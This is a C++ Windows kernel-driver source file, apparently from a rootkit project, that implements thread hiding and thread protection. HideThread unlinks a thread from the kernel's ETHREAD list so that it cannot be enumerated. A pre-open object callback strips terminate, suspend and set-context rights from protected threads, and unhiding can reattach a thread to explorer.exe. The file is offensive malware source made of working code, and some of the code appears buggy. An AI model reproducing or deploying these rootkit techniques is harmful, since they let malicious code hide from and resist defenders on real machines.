#include "pch.h"
#include "ThreadHandler.h"

_IRQL_requires_max_(APC_LEVEL)
ThreadHandler::ThreadHandler() {
	if (!InitializeList(&protectedThreads))
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	if (!InitializeList(&hiddenThreads)) {
		FreeVirtualMemory(this->protectedThreads.Items);
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
	}
}

_IRQL_requires_max_(APC_LEVEL)
ThreadHandler::~ThreadHandler() {
	ClearThreadList(ThreadType::All);
	FreeVirtualMemory(this->protectedThreads.Items);
	FreeVirtualMemory(this->hiddenThreads.Items);
}

/*
* Description:
* OnPreOpenThread is responsible for handling thread access operations and remove certain permissions from protected threads.
*
* Parameters:
* @RegistrationContext [PVOID]						   -- Unused.
* @Info				   [POB_PRE_OPERATION_INFORMATION] -- Contains important information such as thread name, handle to the thread, thread type, etc.
*
* Returns:
* @status			   [NTSTATUS]					   -- Always OB_PREOP_SUCCESS.
*/
OB_PREOP_CALLBACK_STATUS OnPreOpenThread(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info) {
	UNREFERENCED_PARAMETER(RegistrationContext);

	if (Info->KernelHandle)
		return OB_PREOP_SUCCESS;

	PETHREAD thread = static_cast<PETHREAD>(Info->Object);
	ULONG tid = HandleToULong(PsGetThreadId(thread));
	ULONG ownerPid = HandleToULong(PsGetThreadProcessId(thread));
	ULONG callerPid = HandleToULong(PsGetCurrentProcessId());

	// To avoid a situation when a process dies and the thread needs to be closed but it isn't closed, if the killer is its owning process, let it be killed.
	if (callerPid == ownerPid || callerPid == SYSTEM_PROCESS_PID)
		return OB_PREOP_SUCCESS;

	// If the process was found on the list, remove permissions for terminating / setting context / suspending the thread.
	if (NidhoggThreadHandler->FindThread(tid, ThreadType::Protected)) {
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~THREAD_TERMINATE;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~THREAD_SUSPEND_RESUME;
		Info->Parameters->CreateHandleInformation.DesiredAccess &= ~THREAD_SET_CONTEXT;
	}

	return OB_PREOP_SUCCESS;
}

/*
* Description:
* HideThread is responsible for hiding a thread by modifying the entry thread list.
*
* Parameters:
* @tid	  [_In_ ULONG] -- TID to hide.
*
* Returns:
* @status [NTSTATUS]   -- Whether successfully hidden or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS ThreadHandler::HideThread(_In_ ULONG tid) {
	PETHREAD targetThread;
	NTSTATUS status = STATUS_SUCCESS;
	HiddenThreadEntry thread = { 0 };
	ULONG threadListEntryOffset = GetThreadListEntryOffset();
	ULONG lockOffset = GetThreadLockOffset();

	if (threadListEntryOffset == STATUS_UNSUCCESSFUL || lockOffset == STATUS_UNSUCCESSFUL)
		return STATUS_UNSUCCESSFUL;

	status = PsLookupThreadByThreadId(UlongToHandle(tid), &targetThread);

	if (!NT_SUCCESS(status))
		return status;

	PEPROCESS owningProcess = IoThreadToProcess(targetThread);

	if (!owningProcess) {
		ObDereferenceObject(targetThread);
		return STATUS_NOT_FOUND;
	}

	HANDLE owningPid = PsGetProcessId(owningProcess);

	if (owningPid == 0) {
		ObDereferenceObject(targetThread);
		return STATUS_NOT_FOUND;
	}

	// Using the ThreadListEntry lock to avoid accessing problems.
	PLIST_ENTRY threadListEntry = reinterpret_cast<PLIST_ENTRY>(reinterpret_cast<ULONG_PTR>(targetThread) + threadListEntryOffset);
	PEX_PUSH_LOCK listLock = reinterpret_cast<PEX_PUSH_LOCK>(reinterpret_cast<ULONG_PTR>(targetThread) + lockOffset);

	ExAcquirePushLockExclusive(listLock);
	__try {
		RemoveEntryList(threadListEntry);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		status = STATUS_UNSUCCESSFUL;
	}

	if (NT_SUCCESS(status)) {
		thread.OriginalEntry = threadListEntry;
		thread.Tid = tid;
		status = AddHiddenThread(thread) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
	}
	ExReleasePushLockExclusive(listLock);
	ObDereferenceObject(targetThread);
	return status;
}

/*
* Description:
* UnhideThread is responsible for restoring a thread by modifying the thread head list.
*
* Parameters:
* @tid	  [_In_ ULONG] -- TID to restore.
*
* Returns:
* @status [NTSTATUS]   -- Whether successfully restored or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS ThreadHandler::UnhideThread(_In_ ULONG tid) {
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS owningProcess = NULL;
	auto finder = [](const HiddenThreadEntry* item, ULONG tid) {
		return item->Tid == tid;
	};

	if (tid == 0)
		return STATUS_INVALID_PARAMETER;
	HiddenThreadEntry* thread = FindListEntry<ThreadList, HiddenThreadEntry, ULONG>(this->hiddenThreads, tid, finder);

	if (thread->Tid == 0)
		return STATUS_NOT_FOUND;

	ULONG lockOffset = GetProcessLockOffset();
	ULONG threadListHeadOffset = GetThreadListHeadOffset();

	if (threadListHeadOffset == (ULONG)STATUS_UNSUCCESSFUL || lockOffset == (ULONG)STATUS_UNSUCCESSFUL)
		return STATUS_NOT_FOUND;

	status = PsLookupProcessByProcessId(UlongToHandle(thread->Tid), &owningProcess);

	// As backup, if the previous owning process is not found attach the thread to explorer.
	if (!NT_SUCCESS(status)) {
		if (status != STATUS_NOT_FOUND)
			return status;

		ULONG explorerPid = 0;

		__try {
			explorerPid = FindPidByName(L"explorer.exe");
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {
			return GetExceptionCode();
		}

		if (!NT_SUCCESS(status))
			return status;

		status = PsLookupProcessByProcessId(UlongToHandle(explorerPid), &owningProcess);

		if (!NT_SUCCESS(status))
			return status;
	}

	PEX_PUSH_LOCK listLock = reinterpret_cast<PEX_PUSH_LOCK>(reinterpret_cast<ULONG_PTR>(owningProcess) + lockOffset);
	ExAcquirePushLockExclusive(listLock);
	PLIST_ENTRY threadListHead = reinterpret_cast<PLIST_ENTRY>(reinterpret_cast<ULONG_PTR>(owningProcess) + threadListHeadOffset);

	__try {
		InsertTailList(threadListHead, thread->OriginalEntry);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		status = STATUS_UNSUCCESSFUL;
	}

	ExReleasePushLockExclusive(listLock);
	ObDereferenceObject(owningProcess);

	status = RemoveListEntry<ThreadList, HiddenThreadEntry>(&hiddenThreads, thread) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
	return status;
}

/*
* Description:
* FindThread is responsible for searching if a thread exists in the list of protected threads.
*
* Parameters:
* @tid	  [_In_ ULONG]		-- TID to search.
* @type   [_In_ ThreadType] -- Type of thread to search for (Protected or Hidden).
*
* Returns:
* @bool						-- Whether found or not.
*/
_IRQL_requires_max_(DISPATCH_LEVEL)
bool ThreadHandler::FindThread(_In_ ULONG tid, _In_ ThreadType type) {
	if (tid == 0)
		return false;

	switch (type) {
	case ThreadType::Protected: {
		auto finder = [](_In_ const ProtectedThreadEntry* entry, _In_ ULONG tid) -> bool {
			return entry->Tid == tid;
		};

		return FindListEntry<ThreadList, ProtectedThreadEntry, ULONG>(
			this->protectedThreads, tid, finder
		);
		break;
	}
	case ThreadType::Hidden: {
		auto finder = [](_In_ const HiddenThreadEntry* entry, _In_ ULONG tid) -> bool {
			return entry->Tid == tid;
		};

		return FindListEntry<ThreadList, HiddenThreadEntry, ULONG>(
			this->hiddenThreads, tid, finder
		);
		break;
	}
	default:
		return false;
	}
}

/*
* Description:
* RemoveThread is responsible for remove a thread from the list of protected threads.
*
* Parameters:
* @tid	  [_In_ ULONG]		-- TID to remove.
* @type   [_In_ ThreadType] -- Type of thread to remove (Protected or Hidden).
*
* Returns:
* @bool						-- Whether successfully removed or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ThreadHandler::RemoveThread(_In_ ULONG tid, _In_ ThreadType type) {
	if (tid == 0)
		return false;

	switch (type) {
	case ThreadType::Protected: {
		auto finder = [](_In_ const ProtectedThreadEntry* item, _In_ ULONG tid) {
			return item->Tid == tid;
			};
		ProtectedThreadEntry* entry = FindListEntry<ThreadList, ProtectedThreadEntry, ULONG>(protectedThreads, tid, finder);
		return RemoveListEntry<ThreadList, ProtectedThreadEntry>(&protectedThreads, entry);
	}

	case ThreadType::Hidden: {
		auto finder = [](_In_ const HiddenThreadEntry* item, _In_ ULONG tid) {
			return item->Tid == tid;
			};
		HiddenThreadEntry* entry = FindListEntry<ThreadList, HiddenThreadEntry, ULONG>(hiddenThreads, tid, finder);
		return RemoveListEntry<ThreadList, HiddenThreadEntry>(&hiddenThreads, entry);
	}
	default:
		return false;
	}
}

/*
* Description:
* ProtectThread is responsible for adding a thread to the list of protected threads.
*
* Parameters:
* @tid	  [_In_ ULONG] -- TID to add.
*
* Returns:
* @bool				   -- Whether successfully added or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ThreadHandler::ProtectThread(_In_ ULONG tid) {
	if (tid == 0)
		return false;

	if (FindThread(tid, ThreadType::Protected))
		return false;
	ProtectedThreadEntry* newEntry = AllocateMemory<ProtectedThreadEntry*>(sizeof(ProtectedThreadEntry));

	if (!newEntry)
		return false;
	newEntry->Tid = tid;
	AddEntry<ThreadList, ProtectedThreadEntry>(&protectedThreads, newEntry);
	return true;
}

/*
* Description:
* AddHiddenThread is responsible for adding a thread to the list of hidden threads.
*
* Parameters:
* @thread [_In_ HiddenThreadEntry] -- thread to add.
*
* Returns:
* @bool							   -- Whether successfully added or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ThreadHandler::AddHiddenThread(_In_ HiddenThreadEntry thread) {
	if (thread.Tid == 0 || !thread.OriginalEntry)
		return false;

	if (FindThread(thread.Tid, ThreadType::Protected))
		return false;
	HiddenThreadEntry* newEntry = AllocateMemory<HiddenThreadEntry*>(sizeof(HiddenThreadEntry));

	if (!newEntry)
		return false;
	AddEntry<ThreadList, HiddenThreadEntry>(&hiddenThreads, newEntry);
	return true;
}

/*
* Description:
* ListProtectedThreads is responsible for listing the protected threads.
* 
* Parameters:
* @threadList [_Inout_ IoctlThreadList*] -- Output structure to write the TIDs of protected threads.
* 
* Returns:
* @bool									 -- Whether the operation was successful or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ThreadHandler::ListProtectedThreads(_Inout_ IoctlThreadList* threadList) {
	PLIST_ENTRY currentEntry = nullptr;
	SIZE_T count = 0;
	NTSTATUS status = STATUS_SUCCESS;

	if (!threadList)
		return false;
	AutoLock locker(protectedThreads.Lock);

	if (protectedThreads.Count == 0) {
		threadList->Count = 0;
		return true;
	}
	if (threadList->Count == 0) {
		threadList->Count = protectedThreads.Count;
		return true;
	}
	currentEntry = protectedThreads.Items;

	while (currentEntry->Flink != protectedThreads.Items && count < threadList->Count) {
		currentEntry = currentEntry->Flink;
		ProtectedThreadEntry* item = CONTAINING_RECORD(currentEntry, ProtectedThreadEntry, Entry);

		if (item) {
			status = WriteProcessMemory(
				&item->Tid,
				PsGetCurrentProcess(),
				threadList->Threads + count,
				sizeof(ULONG),
				UserMode
			);
			if (!NT_SUCCESS(status)) {
				threadList->Count = count;
				return false;
			}
		}
		count++;
		currentEntry = currentEntry->Flink;
	}
	threadList->Count = count;
	return true;
}

/*
* Description:
* ListHiddenThreads is responsible for listing the hidden threads.
* 
* Parameters:
* @threadList [_Inout_ IoctlThreadList*] -- Output structure to write the TIDs of hidden threads.
* 
* Returns:
* @bool									 -- Whether the operation was successful or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool ThreadHandler::ListHiddenThreads(_Inout_ IoctlThreadList* threadList) {
	PLIST_ENTRY currentEntry = nullptr;
	SIZE_T count = 0;
	NTSTATUS status = STATUS_SUCCESS;

	if (!threadList)
		return false;
	AutoLock locker(hiddenThreads.Lock);

	if (hiddenThreads.Count == 0) {
		threadList->Count = 0;
		return true;
	}
	if (threadList->Count == 0) {
		threadList->Count = hiddenThreads.Count;
		return true;
	}
	currentEntry = hiddenThreads.Items;

	while (currentEntry->Flink != hiddenThreads.Items && count < threadList->Count) {
		currentEntry = currentEntry->Flink;
		HiddenThreadEntry* item = CONTAINING_RECORD(currentEntry, HiddenThreadEntry, Entry);

		if (item) {
			status = WriteProcessMemory(
				&item->Tid,
				PsGetCurrentProcess(),
				threadList->Threads + count,
				sizeof(ULONG),
				UserMode
			);
			if (!NT_SUCCESS(status)) {
				threadList->Count = count;
				return false;
			}
		}
		count++;
		currentEntry = currentEntry->Flink;
	}
	threadList->Count = count;
	return true;
}

/*
* Description:
* ClearThreadList is responsible for clearing the list of threads.
* 
* Parameters:
* @type [_In_ ThreadType] -- Type of thread to clear (Protected or Hidden).
* 
* Returns:
* There is no return value.
*/
_IRQL_requires_max_(APC_LEVEL)
void ThreadHandler::ClearThreadList(_In_ ThreadType type) {
	switch (type) {
	case ThreadType::Protected:
		ClearList<ThreadList, ProtectedThreadEntry>(&this->protectedThreads);
		break;
	case ThreadType::Hidden:
		ClearList<ThreadList, HiddenThreadEntry>(&this->hiddenThreads);
		break;
	case ThreadType::All:
		ClearList<ThreadList, ProtectedThreadEntry>(&this->protectedThreads);
		ClearList<ThreadList, HiddenThreadEntry>(&this->hiddenThreads);
		break;
	}
}